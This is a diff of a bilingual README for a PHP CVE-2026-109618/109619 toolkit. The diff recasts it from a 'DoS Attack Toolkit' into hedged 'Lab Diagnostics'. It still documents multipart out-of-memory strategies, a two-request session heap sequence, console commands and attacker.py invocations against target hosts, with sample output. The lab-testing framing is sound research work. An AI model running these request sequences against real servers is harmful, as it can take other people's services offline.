@@ -1,4 +1,4 @@
-# PHP CVE-2026-109618 / CVE-2026-109619 — DoS Attack Toolkit
+# PHP CVE-2026-109618 / CVE-2026-109619 — Lab Diagnostics
 
 **[中文](#中文说明) | [English](#english)**
 <img width="1453" height="862" alt="image" src="https://github.com/user-attachments/assets/f3cadc02-8a6f-42e2-948b-7e411a5923af" />
@@ -7,9 +7,9 @@
 
 ## English
 
-> Not based on ELF manipulation. Not related to the pseudo-PoCs from Is4yev/php2shell-poc or eness/php2shell.
+> The OOM and Session lifecycle probes do not require ELF offsets. That does not make them portable RCE exploits.
 
-Universal DoS attack toolkit for PHP CVE-2026-109618 and CVE-2026-109619.
+HTTP diagnostic toolkit for PHP CVE-2026-109618 and CVE-2026-109619. Affected-version ranges describe the PHP bugs, not a guarantee that one request sequence will interrupt every unpatched deployment.
 
 ### Quick Start
 
@@ -22,10 +22,10 @@ DoS> target 192.168.1.10:8088
 DoS> 109618
 ```
 
-Two commands to trigger OOM on any unpatched PHP 8.5 Apache server. The console auto-detects the target's `memory_limit` and `post_max_size`, then scales the payload to fit within the POST budget while exceeding the memory limit.
+In a matching lab, the console can observe request-parsing OOM and the Session A→B lifecycle path. It reads `memory_limit` and `post_max_size` only when the target's supplied `health.php` exposes them; otherwise its preset sizes are assumptions. A PHP OOM is not by itself evidence of either CVE or a worker crash.
 
-- **`109618`** — CVE-2026-109618 multipart OOM (triggers `Allowed memory size exhausted` on parsing)
-- **`session`** — CVE-2026-109619 session A→B crash (producer OOM + consumer hits freed heap → worker crash)
+- **`109618`** — multipart OOM candidate; verify the internal interrupted-initialization path separately
+- **`session`** — CVE-2026-109619 Session A→B candidate; a transport error does not establish a worker crash
 
 ```
 DoS> target 192.168.1.10:8088
@@ -39,15 +39,15 @@ Step 1: Health check (baseline)...
   Auto-fit within 8 MiB: part-headers=599,168
 Step 2: Sending 7.3 MiB multipart (part-headers)...
   Fatal error: Allowed memory size of 134217728 bytes exhausted
-  OOM triggered!
+  OOM observed; CVE impact not determined
 
 DoS> session
 [CVE-2026-109619] Session lifecycle probe
 Step 3: Producer (OOM with session progress)...
-  OOM triggered
+  A OOM response observed
 Step 4: Consumer (session progress callback on stale state)...
   ConnectionResetError
-  Worker crashed! (connection reset)
+  B transport error observed; worker crash not confirmed by HTTP alone
 ```
 
 ### Interactive Console
@@ -63,22 +63,22 @@ Commands:
   target <url>                Set target URL (e.g. http://192.168.1.10:8088)
   show                        Show current settings
   health                      Send health check to target
-  109618 [strategy]           Execute CVE-2026-109618 OOM attack
+  109618 [strategy]           Run a CVE-2026-109618 OOM candidate
                               Strategies: part-headers, empty-files, form-value, files-registration
-  109619                      Execute CVE-2026-109619 cross-request crash (fatal-backtrace)
-  session                     Execute CVE-2026-109619 session lifecycle probe
+  109619                      Probe the PHP 8.5 fatal-backtrace path (requires an early consumer)
+  session                     Probe the CVE-2026-109619 Session lifecycle path
   set <key> <value>           Set parameter (see 'set' for list)
   help                        Show this help
   exit / quit                 Exit
 ```
 
-### Two DoS Paths
+### Candidate Paths
 
-#### CVE-2026-109618: Multipart Parsing OOM Crash
+#### CVE-2026-109618: Multipart Parsing OOM
 
-Crafted multipart request bodies trigger OOM (out-of-memory) during PHP's request parsing phase, crashing the Apache worker.
+Multipart request bodies can trigger OOM during PHP request parsing. The same memory limit can reject a request on a patched build; worker termination and CVE-specific memory corruption require separate evidence.
 
-Three OOM trigger strategies:
+Available OOM candidate strategies include:
 - **part-headers** — a single multipart part with massive custom headers (auto-scaled to fit `post_max_size`)
 - **empty-files** — many empty file fields (capped by PHP `max_multipart_body_parts`)
 - **form-value** — large form value (requires `post_max_size >= memory_limit`)
@@ -99,7 +99,9 @@ python attacker.py 109618 --target http://192.168.56.10:8088 --upload oom/upload
 
 #### CVE-2026-109619: Cross-Request Heap Corruption via Session
 
-A two-step A→B sequence: Request A (producer) triggers a fatal error/OOM while session upload-progress is active, leaving stale state; Request B (consumer) on the same worker accesses freed heap data, crashing the worker.
+A two-step A→B candidate: Request A may leave Session state after an interrupted upload-progress operation; Request B must reach the same worker and consume it. The producer state, consumer access, and any process crash must be checked rather than inferred from a timeout.
+
+The separate `109619` command targets PHP 8.5 fatal-error backtrace state. It needs `fatal_error_backtraces` enabled and an explicitly configured early consumer that reports `auto_detect_line_endings=1`; an ordinary `health.php` request is not that consumer. This tool checks that particular configuration, not every possible early diagnostic.
 
 ```bash
 # Dry run
@@ -119,7 +121,7 @@ python session_progress_probe.py --target http://target:8088 --health session/he
 python session_progress_probe.py --target http://target:8089 --expected-php 8.5.12 --health session/health.php --seed session/session-seed.php --producer session/upload.php --consumer session/upload.php --execute --report session-patched.json
 ```
 
-**Availability probe** (measures DoS duration):
+**Availability probe** (samples health during the sequence; timeouts alone do not prove a crash or exact outage duration):
 
 ```bash
 python availability_probe.py --target http://target:8088 --expected-php 8.5.11 --report availability-old.json --execute
@@ -155,7 +157,7 @@ DoS-Attack/
 2. Set `public/` as DocumentRoot
 3. Verify `GET /health.php` returns the `official-cve-lab-v1` marker
 4. For the 109618 OOM path: set `memory_limit 8M` in the `oom/` subdirectory
-5. For the 109619 backtrace path: place `.htaccess` in the `early/` subdirectory
+5. For the PHP 8.5 backtrace path: enable `fatal_error_backtraces` and supply a separate `early/` health endpoint that reports `auto_detect_line_endings=1`. The example `early/health.php` is not bundled; without it, the probe stops at preflight.
 6. Prepare a PHP 8.5.12 comparison environment
 
 ### References
@@ -166,17 +168,15 @@ DoS-Attack/
 
 ### Verdict Criteria
 
-HTTP 500, connection reset, worker PID change, or OOM **alone are insufficient to prove a CVE**. ASAN/debugger analysis targeting the official internal path is needed, along with patched-version comparison. The tools never claim success — verdict is always `not_determined`.
+HTTP 500, connection reset, worker PID change, or OOM **alone are insufficient to prove a CVE or worker crash**. Confirm process exit with server-side logs or a dump, and confirm the CVE path with debugger/ASAN evidence and a patched-version comparison. The CLI JSON verdict remains `not_determined`; interactive output describes observations rather than declaring a confirmed exploit.
 
 ---
 
 ## 中文说明
 
-> 不借助 ELF，不是以下两个伪 PoC 的类似原理。
-> Is4yev/php2shell-poc
-> eness/php2shell
+> OOM 与 Session 生命周期探针不需要 ELF 偏移；这不代表它们是跨构建通用的 RCE 利用。
 
-PHP CVE-2026-109618 和 CVE-2026-109619 的通用拒绝服务攻击工具集。
+PHP CVE-2026-109618 和 CVE-2026-109619 的 HTTP 实验诊断工具。受影响版本范围不等于同一组请求能让每个未修复部署稳定中断服务。
 
 ### 快速开始
 
@@ -189,10 +189,10 @@ DoS> target 192.168.1.10:8088
 DoS> 109618
 ```
 
-两条命令即可对任意未修补的 PHP 8.5 Apache 服务器触发 OOM。控制台自动检测目标的 `memory_limit` 和 `post_max_size`，在 POST 预算内自动放大 payload 超过内存限制。
+在匹配的靶场中，控制台可观察请求解析期 OOM 与 Session A→B 生命周期路径。只有目标提供相应 `health.php` JSON 字段时，程序才能读取 `memory_limit` 和 `post_max_size`；否则使用预设值。OOM 本身不证明 CVE 或 worker 崩溃。
 
-- **`109618`** — CVE-2026-109618 multipart OOM（解析阶段触发 `Allowed memory size exhausted`）
-- **`session`** — CVE-2026-109619 session A→B 崩溃（producer OOM + consumer 访问已释放堆 → worker 崩溃）
+- **`109618`** — multipart OOM 候选；是否进入未完成初始化窗口仍需单独验证
+- **`session`** — CVE-2026-109619 Session A→B 候选；传输错误不能单独证明 worker 崩溃
 
 ```
 DoS> target 192.168.1.10:8088
@@ -206,15 +206,15 @@ Step 1: Health check (baseline)...
   Auto-fit within 8 MiB: part-headers=599,168
 Step 2: Sending 7.3 MiB multipart (part-headers)...
   Fatal error: Allowed memory size of 134217728 bytes exhausted
-  OOM triggered!
+  已观察到 OOM；CVE 影响尚未判定
 
 DoS> session
 [CVE-2026-109619] Session lifecycle probe
 Step 3: Producer (OOM with session progress)...
-  OOM triggered
+  已观察到 A 的 OOM 响应
 Step 4: Consumer (session progress callback on stale state)...
   ConnectionResetError
-  Worker crashed! (connection reset)
+  已观察到 B 传输错误；仅凭 HTTP 不能确认 worker 崩溃
 ```
 
 ### 交互控制台
@@ -230,22 +230,22 @@ Commands:
   target <url>                设置目标 URL（如 http://192.168.1.10:8088）
   show                        显示当前设置
   health                      发送健康检查
-  109618 [strategy]           执行 CVE-2026-109618 OOM 攻击
+  109618 [strategy]           检查 CVE-2026-109618 OOM 候选
                               策略: part-headers, empty-files, form-value, files-registration
-  109619                      执行 CVE-2026-109619 跨请求崩溃
-  session                     执行 CVE-2026-109619 Session 生命周期探针
+  109619                      检查 PHP 8.5 fatal-backtrace 路径（需要早期消费者）
+  session                     检查 CVE-2026-109619 Session 生命周期路径
   set <key> <value>           设置参数（输入 set 查看列表）
   help                        显示帮助
   exit / quit                 退出
 ```
 
-### 两条 DoS 路径
+### 候选路径
 
-#### CVE-2026-109618：Multipart 解析 OOM 崩溃
+#### CVE-2026-109618：Multipart 解析 OOM
 
-通过构造特殊的 multipart 请求体，在 PHP 请求解析阶段触发 OOM（内存耗尽），导致 Apache worker 异常退出。
+Multipart 请求可在 PHP 解析阶段触发 OOM。修复版也可能按内存限额拒绝请求；worker 退出和 CVE 特有的内存损坏需要另外取证。
 
-三种 OOM 触发策略：
+可用的 OOM 候选策略包括：
 - **part-headers** — 单个 multipart part 附加大量自定义头（自动缩放至 `post_max_size` 内）
 - **empty-files** — 大量空文件字段（受 PHP `max_multipart_body_parts` 限制）
 - **form-value** — 超大表单值（需 `post_max_size >= memory_limit`）
@@ -266,7 +266,9 @@ python attacker.py 109618 --target http://192.168.56.10:8088 --upload oom/upload
 
 #### CVE-2026-109619：Session 跨请求堆破坏
 
-两步 A→B 序列：请求 A（producer）在 session upload-progress 活跃时触发 fatal error/OOM，留下残留状态；同一 worker 的请求 B（consumer）访问到已释放的堆数据，导致 worker 崩溃。
+两步 A→B 候选序列：请求 A 在上传进度处理期间被中断后可能留下 Session 状态；请求 B 必须由同一 worker 消费该状态。应分别核实生产者状态、消费者读取和实际进程异常，而不能由超时推断崩溃。
+
+另一个 `109619` 命令针对 PHP 8.5 的致命错误回溯状态，需要启用 `fatal_error_backtraces`，并显式配置会回显 `auto_detect_line_endings=1` 的早期 consumer；普通 `health.php` 请求不具备这个条件。当前工具只检查这一种配置，不覆盖所有可能的早期诊断。
 
 ```bash
 # Dry run
@@ -286,7 +288,7 @@ python session_progress_probe.py --target http://target:8088 --health session/he
 python session_progress_probe.py --target http://target:8089 --expected-php 8.5.12 --health session/health.php --seed session/session-seed.php --producer session/upload.php --consumer session/upload.php --execute --report session-patched.json
 ```
 
-**可用性探针**（度量 DoS 持续时间）：
+**可用性探针**（对请求期间的健康状态采样；超时本身不证明崩溃或精确停机时长）：
 
 ```bash
 python availability_probe.py --target http://target:8088 --expected-php 8.5.11 --report availability-old.json --execute
@@ -322,7 +324,7 @@ DoS-Attack/
 2. 将 `public/` 设为 DocumentRoot
 3. 确认 `GET /health.php` 返回 `official-cve-lab-v1` 标记
 4. 109618 OOM 路径：在 `oom/` 子目录设置 `memory_limit 8M`
-5. 109619 backtrace 路径：在 `early/` 子目录放置 `.htaccess`
+5. PHP 8.5 backtrace 路径：启用 `fatal_error_backtraces`，并提供会回显 `auto_detect_line_endings=1` 的独立 `early/` 健康端点。示例 `early/health.php` 未随仓库提供；缺少它时探针会在预检阶段停止。
 6. 准备 PHP 8.5.12 对照环境
 
 ### 参考资料
@@ -333,4 +335,4 @@ DoS-Attack/
 
 ### 判定边界
 
-HTTP 500、连接重置、worker PID 变化或 OOM **都不足以单独证明 CVE**。需要 ASAN/调试器定位到官方描述的内部路径，并对照修补版本。工具不会宣称成功，verdict 始终为 `not_determined`。
+HTTP 500、连接重置、worker PID 变化或 OOM **都不足以单独证明 CVE 或 worker 崩溃**。进程退出应由服务端日志或转储确认，CVE 内部路径还需调试器/ASAN 与修复版对照。CLI JSON 的 verdict 保持 `not_determined`；交互输出只描述观察现象。
